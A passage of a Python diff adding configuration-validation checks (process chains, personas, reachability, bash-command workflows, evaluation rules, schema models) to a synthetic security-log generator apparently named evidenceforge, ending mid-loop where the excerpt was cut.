+                    Issue(
+                        "WARNING",
+                        "application_catalog.yaml",
+                        f'App "{app_id}" has bare filename image_path for {os_name}: "{image_path}"',
+                    )
+                )
+            for template in platform.get("command_templates", []):
+                if "{{{{" in template or "}}}}" in template:
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "application_catalog.yaml",
+                            f'App "{app_id}" command template for {os_name} contains '
+                            "escaped literal braces that would leak into rendered command lines",
+                        )
+                    )
+    return apps
+
+
+def _validate_process_chains(
+    *,
+    apps: list[dict[str, Any]],
+    process_net_data: dict[str, Any],
+    result: ValidationResult,
+    spawn_data: dict[str, Any],
+    sys_proc_data: dict[str, Any],
+) -> None:
+    """Validate process chains in the established diagnostic order."""
+    # --- Checks 18-20: Process Chain ---
+    # Collect all exe basenames from spawn rules
+    spawn_children: set[str] = set()
+    for os_rules in [spawn_data.get("windows", {}), spawn_data.get("linux", {})]:
+        for _parent, parent_data in os_rules.items():
+            if isinstance(parent_data, dict):
+                for child in parent_data.get("children", []):
+                    spawn_children.add(child)
+
+    # Collect all exe basenames from app catalog
+    catalog_exes: set[str] = set()
+    for app in apps:
+        for platform in app.get("platforms", {}).values():
+            image_path = platform.get("image_path", "")
+            if image_path:
+                basename = image_path.rsplit("\\", 1)[-1].rsplit("/", 1)[-1]
+                catalog_exes.add(basename)
+
+    # sys_proc_data loaded above via overlay-aware loader
+    system_exes: set[str] = set()
+    if sys_proc_data:
+        for task in sys_proc_data.get("scheduled_tasks", []):
+            image = task.get("image", "")
+            if image:
+                system_exes.add(image.rsplit("\\", 1)[-1].rsplit("/", 1)[-1])
+        for role_data in sys_proc_data.get("system_services", {}).values():
+            if isinstance(role_data, list):
+                for proc in role_data:
+                    image = proc.get("image", "")
+                    if image:
+                        system_exes.add(image.rsplit("\\", 1)[-1].rsplit("/", 1)[-1])
+        # system_binaries section: explicit exe name → path mappings
+        for os_binaries in sys_proc_data.get("system_binaries", {}).values():
+            if isinstance(os_binaries, list):
+                for entry in os_binaries:
+                    exe = entry.get("exe", "")
+                    if exe:
+                        system_exes.add(exe)
+
+    known_exes = catalog_exes | system_exes
+    # Case-insensitive lookup for Windows exe matching
+    known_exes_lower = {e.lower() for e in known_exes}
+
+    # Check 18: Orphaned spawn rule children (case-insensitive)
+    for child in spawn_children:
+        if child.lower() not in known_exes_lower:
+            result.issues.append(
+                Issue(
+                    "WARNING",
+                    "spawn_rules.yaml",
+                    f'Child "{child}" not found in application_catalog or system_processes',
+                )
+            )
+
+    # Check 19: Missing spawn rules (apps not in any spawn rule, case-insensitive)
+    spawn_all_entries: set[str] = set()
+    for os_rules in [spawn_data.get("windows", {}), spawn_data.get("linux", {})]:
+        spawn_all_entries.update(os_rules.keys())
+        for parent_data in os_rules.values():
+            if isinstance(parent_data, dict):
+                spawn_all_entries.update(parent_data.get("children", []))
+    spawn_all_entries_lower = {e.lower() for e in spawn_all_entries}
+
+    for exe in catalog_exes:
+        if exe.lower() not in spawn_all_entries_lower:
+            result.issues.append(
+                Issue(
+                    "INFO",
+                    "application_catalog.yaml",
+                    f'App exe "{exe}" not listed in any spawn rule',
+                )
+            )
+
+    # Check 20: Orphaned process_network_map entries (case-insensitive)
+    pnm_exes: set[str] = set()
+    if isinstance(process_net_data, list):
+        for mapping in process_net_data:
+            pnm_exes.update(mapping.get("exe", []))
+    for exe in pnm_exes:
+        if exe.lower() not in known_exes_lower:
+            result.issues.append(
+                Issue(
+                    "WARNING",
+                    "process_network_map.yaml",
+                    f'Exe "{exe}" not found in application_catalog or system_processes',
+                )
+            )
+
+
+def _validate_personas(
+    *,
+    apps: list[dict[str, Any]],
+    persona_names: set[str],
+    persona_traffic: dict[str, Any],
+    result: ValidationResult,
+) -> list[dict[str, Any]]:
+    """Validate personas in the established diagnostic order."""
+    # --- Checks 22-25: Persona Integrity ---
+    # Validate MERGED persona data (package + overlay) so partial overlay
+    # personas that modify a few fields don't fail for missing required fields.
+    # Check 21 (filename/name mismatch) removed — not applicable with merged data.
+    from evidenceforge.utils.personas import load_builtin_personas
+
+    all_merged_personas = load_builtin_personas()
+    for persona in all_merged_personas:
+        name = persona.get("name", "<unnamed>")
+
+        # Check 22: Missing required fields
+        for req_field in REQUIRED_PERSONA_FIELDS:
+            if req_field not in persona:
+                result.issues.append(
+                    Issue("ERROR", f"persona:{name}", f"Missing required field: {req_field}")
+                )
+
+        # Check 23: Invalid risk_profile
+        risk = persona.get("risk_profile", "")
+        if risk and risk not in VALID_RISK_PROFILES:
+            result.issues.append(
+                Issue("ERROR", f"persona:{name}", f'Invalid risk_profile: "{risk}"')
+            )
+
+        # Check 24: Invalid browsing_intensity
+        intensity = persona.get("browsing_intensity", "")
+        if intensity and intensity not in VALID_BROWSING_INTENSITIES:
+            result.issues.append(
+                Issue("ERROR", f"persona:{name}", f'Invalid browsing_intensity: "{intensity}"')
+            )
+
+    # Check 25: Phantom personas (referenced but no file)
+    all_referenced_personas: set[str] = set()
+    for app in apps:
+        all_referenced_personas.update(app.get("personas", []))
+    for persona_name in persona_traffic:
+        all_referenced_personas.add(persona_name)
+    all_referenced_personas.discard("default")
+    # Underscore-prefixed names are internal profiles, not actual personas
+    all_referenced_personas = {p for p in all_referenced_personas if not p.startswith("_")}
+
+    for persona in all_referenced_personas - persona_names:
+        result.issues.append(
+            Issue(
+                "WARNING",
+                "application_catalog/traffic_profiles",
+                f'Persona "{persona}" referenced but no persona file exists',
+            )
+        )
+    return all_merged_personas
+
+
+def _validate_reachability(
+    *,
+    all_dns_tags: set[str],
+    all_traffic_entries: list[dict[str, Any]],
+    apps: list[dict[str, Any]],
+    domains: list[dict[str, Any]],
+    persona_names: set[str],
+    process_net_data: dict[str, Any],
+    result: ValidationResult,
+) -> None:
+    """Validate reachability in the established diagnostic order."""
+    # --- Checks 28-30: Defined But Unreachable ---
+
+    # Collect all dns_tags referenced by generation config. Traffic profiles
+    # drive role/persona baseline traffic; process_network_map drives
+    # process-correlated external app traffic (for example Teams→M365).
+    all_traffic_dns_tags: set[str] = set()
+    for entry in all_traffic_entries:
+        all_traffic_dns_tags.update(entry.get("dns_tags", []))
+    for entry in process_net_data:
+        all_traffic_dns_tags.update(entry.get("dns_tags", []))
+
+    # Check 28: DNS tags on domains that no generation config references
+    # Tags that reach domains through other mechanisms (not dns_tags):
+    #   cdn — loaded as subresources via site_maps
+    #   internal — reached via role-based connections (database, file_server, etc.)
+    _TAGS_REACHED_WITHOUT_DNS_TAGS = {"cdn", "internal"}
+    for tag in all_dns_tags - _TAGS_REACHED_WITHOUT_DNS_TAGS:
+        if tag not in all_traffic_dns_tags:
+            domains_with_tag = [e["domain"] for e in domains if tag in e.get("tags", [])]
+            if domains_with_tag:
+                example = domains_with_tag[0]
+                count = len(domains_with_tag)
+                result.issues.append(
+                    Issue(
+                        "INFO",
+                        "dns_registry.yaml",
+                        f'Tag "{tag}" used by {count} domain(s) (e.g., "{example}") but no generation config references it via dns_tags — these domains will never receive traffic',
+                    )
+                )
+
+    # Check 29: Personas not in any application's personas list
+    all_app_personas: set[str] = set()
+    for app in apps:
+        all_app_personas.update(app.get("personas", []))
+    for persona in persona_names:
+        if persona not in all_app_personas and "default" not in all_app_personas:
+            result.issues.append(
+                Issue(
+                    "INFO",
+                    f"personas/{persona}.yaml",
+                    f'Persona "{persona}" is not in any application\'s personas list — this persona will never spawn user apps',
+                )
+            )
+
+    # Check 30: Bash command roles with no matching persona
+    # Special keys that aren't persona roles:
+    #   common — shared commands for all roles
+    #   params — placeholder pools for template resolution
+    #   keyboard_adjacency — typo model data
+    #   workflow_model/workflows — role-specific command sequence model
+    #   dba, webadmin, security — sub-role pools mapped from personas by _get_role_pool()
+    _BASH_SPECIAL_KEYS = {
+        "common",
+        "params",
+        "keyboard_adjacency",
+        "typo_model",
+        "workflow_model",
+        "workflows",
+        "package_manager_model",
+        "storyline_friction",
+        "dba",
+        "webadmin",
+        "security",
+    }
+    from evidenceforge.generation.activity.bash_commands import load_bash_commands
+
+    bash_data = load_bash_commands()
+    if bash_data:
+        typo_model = bash_data.get("typo_model", {})
+        if not isinstance(typo_model, dict):
+            result.issues.append(
+                Issue("ERROR", "bash_commands.yaml", "typo_model must be a mapping")
+            )
+        else:
+            max_rate = typo_model.get("max_rate", 0.08)
+            correction_probability = typo_model.get("correction_probability", 0.85)
+            short_history_threshold = typo_model.get("short_history_threshold", 8)
+            short_history_max_typos = typo_model.get("short_history_max_typos", 1)
+            for field_name, value in {
+                "max_rate": max_rate,
+                "correction_probability": correction_probability,
+            }.items():
+                if not isinstance(value, int | float) or not 0 <= float(value) <= 1:
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "bash_commands.yaml",
+                            f"typo_model.{field_name} must be a number between 0 and 1",
+                        )
+                    )
+            for field_name, value in {
+                "short_history_threshold": short_history_threshold,
+                "short_history_max_typos": short_history_max_typos,
+            }.items():
+                if not isinstance(value, int) or value < 0:
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "bash_commands.yaml",
+                            f"typo_model.{field_name} must be a non-negative integer",
+                        )
+                    )
+        package_manager_model = bash_data.get("package_manager_model", {})
+        if package_manager_model and not isinstance(package_manager_model, dict):
+            result.issues.append(
+                Issue("ERROR", "bash_commands.yaml", "package_manager_model must be a mapping")
+            )
+        elif isinstance(package_manager_model, dict):
+            families = package_manager_model.get("families", {})
+            if not isinstance(families, dict) or not families:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "bash_commands.yaml",
+                        "package_manager_model.families must be a non-empty mapping",
+                    )
+                )
+            else:
+                seen_prefixes: dict[str, str] = {}
+                for family_name, family_config in families.items():
+                    if not isinstance(family_config, dict):
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "bash_commands.yaml",
+                                f"package_manager_model.families.{family_name} must be a mapping",
+                            )
+                        )
+                        continue
+                    for field_name in ("os_keywords", "command_prefixes"):
+                        values = family_config.get(field_name)
+                        if (
+                            not isinstance(values, list)
+                            or not values
+                            or not all(isinstance(value, str) and value.strip() for value in values)
+                        ):
+                            result.issues.append(
+                                Issue(
+                                    "ERROR",
+                                    "bash_commands.yaml",
+                                    "package_manager_model.families."
+                                    f"{family_name}.{field_name} must be a non-empty "
+                                    "list of strings",
+                                )
+                            )
+                    prefixes = family_config.get("command_prefixes", [])
+                    if isinstance(prefixes, list):
+                        for prefix in prefixes:
+                            if not isinstance(prefix, str) or not prefix.strip():
+                                continue
+                            normalized = prefix.strip().lower()
+                            owner = seen_prefixes.get(normalized)
+                            if owner and owner != str(family_name):
+                                result.issues.append(
+                                    Issue(
+                                        "ERROR",
+                                        "bash_commands.yaml",
+                                        f"package-manager command prefix {prefix!r} belongs to "
+                                        f"both {owner!r} and {family_name!r}",
+                                    )
+                                )
+                            seen_prefixes[normalized] = str(family_name)
+        for role_key in bash_data:
+            if role_key in _BASH_SPECIAL_KEYS:
+                continue
+            if role_key not in persona_names:
+                result.issues.append(
+                    Issue(
+                        "INFO",
+                        "bash_commands.yaml",
+                        f'Role "{role_key}" has no matching persona — these commands will never be generated',
+                    )
+                )
+        workflow_model = bash_data.get("workflow_model", {})
+        if workflow_model and not isinstance(workflow_model, dict):
+            result.issues.append(
+                Issue("ERROR", "bash_commands.yaml", "workflow_model must be a mapping")
+            )
+        elif isinstance(workflow_model, dict):
+            selection_probability = workflow_model.get("selection_probability", 0.65)
+            if (
+                not isinstance(selection_probability, int | float)
+                or not 0 <= float(selection_probability) <= 1
+            ):
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "bash_commands.yaml",
+                        "workflow_model.selection_probability must be a number between 0 and 1",
+                    )
+                )
+        workflows = bash_data.get("workflows", {})
+        if workflows and not isinstance(workflows, dict):
+            result.issues.append(
+                Issue("ERROR", "bash_commands.yaml", "workflows must be a mapping")
+            )
+        elif isinstance(workflows, dict):
+            valid_workflow_roles = set(persona_names) | _BASH_SPECIAL_KEYS
+            for role_key, role_workflows in workflows.items():
+                if role_key not in valid_workflow_roles:
+                    result.issues.append(
+                        Issue(
+                            "INFO",
+                            "bash_commands.yaml",
+                            f'Workflow role "{role_key}" has no matching persona or role mapping',
+                        )
+                    )
+                if not isinstance(role_workflows, list):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "bash_commands.yaml",
+                            f"workflows.{role_key} must be a list",
+                        )
+                    )
+                    continue
+                for index, workflow in enumerate(role_workflows, start=1):
+                    if not isinstance(workflow, dict):
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "bash_commands.yaml",
+                                f"workflows.{role_key}[{index}] must be a mapping",
+                            )
+                        )
+                        continue
+                    weight = workflow.get("weight", 1)
+                    if not isinstance(weight, int | float) or float(weight) <= 0:
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "bash_commands.yaml",
+                                f"workflows.{role_key}[{index}].weight must be a positive number",
+                            )
+                        )
+                    steps = workflow.get("steps")
+                    if not isinstance(steps, list) or not steps:
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "bash_commands.yaml",
+                                f"workflows.{role_key}[{index}].steps must be a non-empty list",
+                            )
+                        )
+                        continue
+                    for step_index, step in enumerate(steps, start=1):
+                        if isinstance(step, str):
+                            if not step.strip():
+                                result.issues.append(
+                                    Issue(
+                                        "ERROR",
+                                        "bash_commands.yaml",
+                                        f"workflows.{role_key}[{index}].steps[{step_index}] must not be empty",
+                                    )
+                                )
+                            continue
+                        if not isinstance(step, list) or not step:
+                            result.issues.append(
+                                Issue(
+                                    "ERROR",
+                                    "bash_commands.yaml",
+                                    f"workflows.{role_key}[{index}].steps[{step_index}] must be a command string or non-empty list",
+                                )
+                            )
+                            continue
+                        for option_index, option in enumerate(step, start=1):
+                            if not isinstance(option, str) or not option.strip():
+                                result.issues.append(
+                                    Issue(
+                                        "ERROR",
+                                        "bash_commands.yaml",
+                                        f"workflows.{role_key}[{index}].steps[{step_index}][{option_index}] must be a non-empty string",
+                                    )
+                                )
+
+
+def _validate_evaluation_rules(
+    *,
+    evaluation_dir: Path,
+    formats_dir: Path,
+    result: ValidationResult,
+) -> None:
+    """Validate evaluation rules in the established diagnostic order."""
+    # --- Checks 26-27: Evaluation Rule Integrity ---
+    format_names = {f.stem for f in formats_dir.glob("*.yaml")}
+    format_fields: dict[str, set[str]] = {}
+    for fmt_file in formats_dir.glob("*.yaml"):
+        fmt_data, _ = _safe_load_yaml(fmt_file)
+        if fmt_data:
+            fields = set()
+            # Top-level fields
+            for f in fmt_data.get("fields", []):
+                if isinstance(f, dict) and "name" in f:
+                    fields.add(f["name"])
+            # Per-EventID variant fields (e.g., windows_event_security)
+            for variant in fmt_data.get("variants", []):
+                for f in variant.get("fields", []):
+                    if isinstance(f, dict) and "name" in f:
+                        fields.add(f["name"])
+            format_fields[fmt_file.stem] = fields
+
+    for eval_file in evaluation_dir.glob("*.yaml"):
+        eval_data, err = _safe_load_yaml(eval_file)
+        if err or not eval_data:
+            continue
+
+        if eval_file.stem in {"thresholds", "timing_bounds", "cross_source_pairs"}:
+            # These files use non-format-keyed schemas; skip format-key validation
+            continue
+
+        if eval_file.stem == "causal_pairs":
+            # causal_pairs has a different structure
+            for pair in eval_data.get("pairs", []):
+                for direction in ["before", "after"]:
+                    fmt = pair.get(direction, {}).get("format", "")
+                    if fmt and fmt not in format_names:
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                eval_file.name,
+                                f'Causal pair references unknown format "{fmt}"',
+                            )
+                        )
+        else:
+            # co_occurrence and distributions are keyed by format name
+            for fmt_key in eval_data:
+                # Check 27: Invalid format references
+                if fmt_key not in format_names:
+                    result.issues.append(
+                        Issue(
+                            "ERROR", eval_file.name, f'Rules under unknown format key "{fmt_key}"'
+                        )
+                    )
+                    continue
+
+                # Check 26: Invalid field references
+                known_fields = format_fields.get(fmt_key, set())
+                if not known_fields:
+                    continue
+
+                rules = eval_data[fmt_key]
+                if isinstance(rules, list):
+                    for rule in rules:
+                        # co_occurrence rules reference fields in condition and checks
+                        for check_field in _extract_field_refs(rule):
+                            if check_field not in known_fields:
+                                result.issues.append(
+                                    Issue(
+                                        "WARNING",
+                                        eval_file.name,
+                                        f'Rule references field "{check_field}" not in {fmt_key} format',
+                                    )
+                                )
+
+
+def _validate_merged_schemas(
+    *,
+    all_merged_personas: list[dict[str, Any]],
+    apps: list[dict[str, Any]],
+    auth_noise_data: dict[str, Any],
+    calltrace_config: dict[str, Any],
+    command_parameter_pools_data: dict[str, Any],
+    create_remote_thread_config: dict[str, Any],
+    create_remote_thread_data: dict[str, Any],
+    domains: list[dict[str, Any]],
+    email_background_data: dict[str, Any],
+    endpoint_noise_data: dict[str, Any],
+    external_actor_profiles_data: dict[str, Any],
+    host_activity_profiles_data: dict[str, Any],
+    mail_public_identities_data: dict[str, Any],
+    observation_profiles_data: dict[str, Any],
+    process_access_data: dict[str, Any],
+    process_net_data: dict[str, Any],
+    proxy_ua_data: dict[str, Any],
+    public_dns_profiles_data: dict[str, Any],
+    public_identity_profiles_data: dict[str, Any],
+    result: ValidationResult,
+    spawn_data: dict[str, Any],
+    suspicious_benign_data: dict[str, Any],
+    sys_proc_data: dict[str, Any],
+    traffic_data: dict[str, Any],
+    windows_auth_data: dict[str, Any],
+) -> None:
+    """Validate merged schemas in the established diagnostic order."""
+    # --- Schema validation: validate merged entries against Pydantic models ---
+    from evidenceforge.config.schemas import (
+        ApplicationEntry,
+        AuthNoiseConfig,
+        BeaconProfilesConfig,
+        CallTracePatternEntry,
+        CallTraceSourceFamilyEntry,
+        CommandParameterPoolsConfig,
+        ConnectionEntry,
+        CreateRemoteThreadNoiseConfig,
+        CreateRemoteThreadPatternEntry,
+        DnsEntry,
+        DnsTunnelRttConfig,
+        DnsTunnelTtlEntry,
+        EdrFileSideEffectProfile,
+        EdrInstalledSoftwareProduct,
+        EmailBackgroundConfig,
+        EndpointNoiseConfig,
+        ExternalActorProfilesConfig,
+        ExternalScannerPortProfile,
+        HostActivityProfilesConfig,
+        HttpFileProfilesConfig,
+        KerberosRealismConfig,
+        LoadedModuleEntry,
+        MailPublicIdentitiesConfig,
+        NmapCommandProbeConfig,
+        ObservationProfilesConfig,
+        OuiEntry,
+        PersonaEntry,
+        ProcessAccessPatternEntry,
+        ProcessNetworkEntry,
+        ProxyUserAgentOverrideEntry,
+        PublicDnsProfilesConfig,
+        PublicDnsResolverEntry,
+        PublicIdentityProfilesConfig,
+        PublicNtpServerEntry,
+        RemoteThreadStartLocationEntry,
+        ScheduledTaskEntry,
+        SpawnRuleEntry,
+        SuspiciousBenignConfig,
+        SyslogProgramEntry,
+        SystemBinaryEntry,
+        SystemdScheduleEntry,
+        SystemServiceEntry,
+        TlsIssuerEntry,
+        TlsRealismConfig,
+        WindowsAuthRealismConfig,
+        validate_entry,
+    )
+
+    _SCHEMA_CHECKS: list[tuple[list, type, str]] = [
+        (domains, DnsEntry, "dns_registry.yaml"),
+        (apps, ApplicationEntry, "application_catalog.yaml"),
+        (all_merged_personas, PersonaEntry, "personas"),
+        ([email_background_data], EmailBackgroundConfig, "email_background.yaml"),
+        (
+            [public_identity_profiles_data],
+            PublicIdentityProfilesConfig,
+            "public_identity_profiles.yaml",
+        ),
+        ([mail_public_identities_data], MailPublicIdentitiesConfig, "mail_public_identities.yaml"),
+        (
+            [external_actor_profiles_data],
+            ExternalActorProfilesConfig,
+            "external_actor_profiles.yaml",
+        ),
+        ([suspicious_benign_data], SuspiciousBenignConfig, "suspicious_benign.yaml"),
+        (
+            [command_parameter_pools_data],
+            CommandParameterPoolsConfig,
+            "command_parameter_pools.yaml",
+        ),
+    ]
+
+    # system_processes.yaml: scheduled_tasks, system_services, system_binaries
+    if sys_proc_data:
+        _SCHEMA_CHECKS.append(
+            (
+                sys_proc_data.get("scheduled_tasks", []),
+                ScheduledTaskEntry,
+                "system_processes.yaml (scheduled_tasks)",
+            )
+        )
+        common_modules = (sys_proc_data.get("common_loaded_modules") or {}).get("windows", [])
+        if isinstance(common_modules, list):
+            _SCHEMA_CHECKS.append(
+                (
+                    common_modules,
+                    LoadedModuleEntry,
+                    "system_processes.yaml (common_loaded_modules.windows)",
+                )
+            )
+        for exe_name, modules in (sys_proc_data.get("process_loaded_modules") or {}).items():
+            if isinstance(modules, list):
+                _SCHEMA_CHECKS.append(
+                    (
+                        modules,
+                        LoadedModuleEntry,
+                        f"system_processes.yaml (process_loaded_modules.{exe_name})",
+                    )
+                )
+        for role_name, role_entries in sys_proc_data.get("system_services", {}).items():
+            if isinstance(role_entries, list):
+                _SCHEMA_CHECKS.append(
+                    (
+                        role_entries,
+                        SystemServiceEntry,
+                        f"system_processes.yaml (system_services.{role_name})",
+                    )
+                )
+        for os_name, os_binaries in sys_proc_data.get("system_binaries", {}).items():
+            if isinstance(os_binaries, list):
+                _SCHEMA_CHECKS.append(
+                    (
+                        os_binaries,
+                        SystemBinaryEntry,
+                        f"system_processes.yaml (system_binaries.{os_name})",
+                    )
+                )
+        for role_name, role_entries in sys_proc_data.get("system_services", {}).items():
+            if not isinstance(role_entries, list):
+                continue
+            for entry in role_entries:
+                if not isinstance(entry, dict):
+                    continue
+                image = str(entry.get("image") or "")
+                exe = image.rsplit("\\", 1)[-1].rsplit("/", 1)[-1].lower()
+                if exe in WINDOWS_BOOT_ONLY_PROCESS_EXES:
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "system_processes.yaml",
+                            f'Boot-only Windows process "{exe}" must be seeded at boot, not emitted as recurring system_services.{role_name}',
+                        )
+                    )
+                if entry.get("singleton"):
+                    parent = str(entry.get("parent") or "").lower()
+                    if parent != "services":
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "system_processes.yaml",
+                                f'Singleton Windows service "{exe}" in system_services.{role_name} must use parent "services"',
+                            )
+                        )
+                    normalized_image = image.replace("/", "\\").lower()
+                    if not normalized_image.startswith("c:\\") or "\\" not in normalized_image:
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "system_processes.yaml",
+                                f'Singleton Windows service "{exe}" in system_services.{role_name} must use a concrete Windows image path',
+                            )
+                        )
+
+    # process_network_map.yaml
+    if isinstance(process_net_data, list):
+        _SCHEMA_CHECKS.append((process_net_data, ProcessNetworkEntry, "process_network_map.yaml"))
+
+    # process_access_patterns.yaml
+    if isinstance(process_access_data, list):
+        _SCHEMA_CHECKS.append(
+            (process_access_data, ProcessAccessPatternEntry, "process_access_patterns.yaml")
+        )
+    if isinstance(calltrace_config, dict):
+        calltrace_patterns = calltrace_config.get("patterns", [])
+        calltrace_families = calltrace_config.get("source_families", {})
+        if isinstance(calltrace_patterns, list):
+            _SCHEMA_CHECKS.append(
+                (calltrace_patterns, CallTracePatternEntry, "calltrace_patterns.yaml patterns")
+            )
+        if isinstance(calltrace_families, dict):
+            family_entries = [
+                family for family in calltrace_families.values() if isinstance(family, dict)
+            ]
+            _SCHEMA_CHECKS.append(
+                (
+                    family_entries,
+                    CallTraceSourceFamilyEntry,
+                    "calltrace_patterns.yaml source_families",
+                )
+            )
+            pattern_ids = {
+                str(pattern.get("id"))
+                for pattern in calltrace_patterns
+                if isinstance(pattern, dict) and pattern.get("id")
+            }
+            for family_name, family_config in calltrace_families.items():
+                if not isinstance(family_config, dict):
+                    continue
+                for pattern_id in family_config.get("pattern_ids", []):
+                    if str(pattern_id) not in pattern_ids:
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "calltrace_patterns.yaml",
+                                (
+                                    f'Source family "{family_name}" references unknown '
+                                    f'pattern_id "{pattern_id}"'
+                                ),
+                            )
+                        )
+    if isinstance(create_remote_thread_data, list):
+        _SCHEMA_CHECKS.append(
+            (
+                create_remote_thread_data,
+                CreateRemoteThreadPatternEntry,
+                "create_remote_thread_patterns.yaml",
+            )
+        )
+    remote_thread_locations = []
+    for locations in (create_remote_thread_config.get("start_locations") or {}).values():
+        if isinstance(locations, list):
+            remote_thread_locations.extend(locations)
+    for override in (create_remote_thread_config.get("target_overrides") or {}).values():
+        if isinstance(override, dict) and isinstance(override.get("start_locations"), list):
+            remote_thread_locations.extend(override["start_locations"])
+    _SCHEMA_CHECKS.append(
+        (
+            remote_thread_locations,
+            RemoteThreadStartLocationEntry,
+            "create_remote_thread_patterns.yaml start_locations",
+        )
+    )
+    try:
+        CreateRemoteThreadNoiseConfig.model_validate(
+            create_remote_thread_config.get("baseline_noise", {})
+        )
+    except Exception as exc:  # noqa: BLE001
+        result.issues.append(
+            Issue(
+                "ERROR",
+                "create_remote_thread_patterns.yaml baseline_noise",
+                f"invalid baseline_noise config: {exc}",
+            )
+        )
+
+    from evidenceforge.generation.activity.edr_pools import load_edr_pools
+
+    edr_pools_data = load_edr_pools()
+    if edr_pools_data:
+        _validate_edr_file_path_pools(result, edr_pools_data)
+        _validate_registry_mru_filenames(result, edr_pools_data)
+        _SCHEMA_CHECKS.append(
+            (
+                edr_pools_data.get("file_side_effect_profiles", []),
+                EdrFileSideEffectProfile,
+                "edr_pools.yaml (file_side_effect_profiles)",
+            )
+        )
+        _SCHEMA_CHECKS.append(
+            (
+                edr_pools_data.get("installed_software_products", []),
+                EdrInstalledSoftwareProduct,
+                "edr_pools.yaml (installed_software_products)",
+            )
+        )
+    if endpoint_noise_data:
+        _SCHEMA_CHECKS.append(([endpoint_noise_data], EndpointNoiseConfig, "endpoint_noise.yaml"))
+    if observation_profiles_data:
+        _SCHEMA_CHECKS.append(
+            ([observation_profiles_data], ObservationProfilesConfig, "observation_profiles.yaml")
+        )
+    if host_activity_profiles_data:
+        _SCHEMA_CHECKS.append(
+            (
+                [host_activity_profiles_data],
+                HostActivityProfilesConfig,
+                "host_activity_profiles.yaml",
+            )
+        )
+
+    # traffic_profiles.yaml: connection entries
+    all_traffic_connection_entries = []
+    for _rn, role_data in traffic_data.get("role_traffic", {}).items():
+        if isinstance(role_data, dict):
+            for direction in ["outbound", "inbound"]:
+                all_traffic_connection_entries.extend(role_data.get(direction, []))
+    for _pn, persona_entries in traffic_data.get("persona_traffic", {}).items():
+        if isinstance(persona_entries, dict):
+            for direction in ["outbound", "inbound"]:
+                all_traffic_connection_entries.extend(persona_entries.get(direction, []))
+        elif isinstance(persona_entries, list):
+            all_traffic_connection_entries.extend(persona_entries)
+    _SCHEMA_CHECKS.append(
+        (all_traffic_connection_entries, ConnectionEntry, "traffic_profiles.yaml")
+    )
+
+    # spawn_rules.yaml: spawn rule entries
+    all_spawn_entries = []
+    for os_rules in [spawn_data.get("windows", {}), spawn_data.get("linux", {})]:
+        for _parent, parent_data in os_rules.items():
+            if isinstance(parent_data, dict):
+                all_spawn_entries.append(parent_data)
+    _SCHEMA_CHECKS.append((all_spawn_entries, SpawnRuleEntry, "spawn_rules.yaml"))
+
+    # tls_issuers.yaml
+    from evidenceforge.generation.activity.tls_issuers import load_tls_issuers
+
+    tls_data = load_tls_issuers()
+    if tls_data:
+        _SCHEMA_CHECKS.append((tls_data.get("issuers", []), TlsIssuerEntry, "tls_issuers.yaml"))
+        _validate_tls_issuer_overrides(result, tls_data)
+
+    # tls_realism.yaml
+    from evidenceforge.generation.activity.tls_realism import load_tls_realism
+
+    tls_realism_data = load_tls_realism()
+    if tls_realism_data:
+        _SCHEMA_CHECKS.append(([tls_realism_data], TlsRealismConfig, "tls_realism.yaml"))
+
+    # public_dns_profiles.yaml
+    if public_dns_profiles_data:
+        _SCHEMA_CHECKS.append(
+            ([public_dns_profiles_data], PublicDnsProfilesConfig, "public_dns_profiles.yaml")
+        )
+
+    # kerberos_realism.yaml
+    from evidenceforge.generation.activity.kerberos_realism import load_kerberos_realism
+
+    kerberos_realism_data = load_kerberos_realism()
+    if kerberos_realism_data:
+        _SCHEMA_CHECKS.append(
+            ([kerberos_realism_data], KerberosRealismConfig, "kerberos_realism.yaml")
+        )
+
+    # http_file_profiles.yaml
+    from evidenceforge.generation.activity.http_file_profiles import load_http_file_profiles
+
+    http_file_profile_data = load_http_file_profiles()
+    if http_file_profile_data:
+        _SCHEMA_CHECKS.append(
+            ([http_file_profile_data], HttpFileProfilesConfig, "http_file_profiles.yaml")
+        )
+
+    # extra_syslog_messages.yaml
+    from evidenceforge.generation.activity.extra_syslog import load_extra_syslog_messages
+
+    syslog_data = load_extra_syslog_messages()
+    if syslog_data:
+        _SCHEMA_CHECKS.append((syslog_data, SyslogProgramEntry, "extra_syslog_messages.yaml"))
+        for entry in syslog_data:
+            if not isinstance(entry, dict):
+                continue
+            app = str(entry.get("app") or "<unknown>")
+            _VALID_SYSLOG_SYSTEM_TYPES = {"workstation", "server", "domain_controller"}
+            system_types = entry.get("system_types", [])
+            if not isinstance(system_types, list):
+                system_types = []
+            for system_type in system_types:
+                if system_type not in _VALID_SYSLOG_SYSTEM_TYPES:
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "extra_syslog_messages.yaml",
+                            (
+                                f'App "{app}" has invalid system_type "{system_type}" '
+                                f"(valid: {sorted(_VALID_SYSLOG_SYSTEM_TYPES)})"
+                            ),
+                        )
+                    )
+            messages = entry.get("messages", [])
+            if not isinstance(messages, list):
+                messages = []
+            params = entry.get("params")
+            param_strings = (
+                [
+                    value
+                    for values in params.values()
+                    if isinstance(values, list)
+                    for value in values
+                    if isinstance(value, str)
+                ]
+                if isinstance(params, dict)
+                else []
+            )
+            schedule_check_values = messages if app == "anacron" else messages + param_strings
+            for message in messages:
+                if not isinstance(message, str):
+                    continue
+                message_lower = message.lower()
+                if not entry.get("transient") and any(
+                    pattern in message_lower for pattern in RECURRING_SYSLOG_STARTUP_PATTERNS
+                ):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "extra_syslog_messages.yaml",
+                            f'Persistent app "{app}" has recurring startup banner "{message}"',
+                        )
+                    )
+            for message in schedule_check_values:
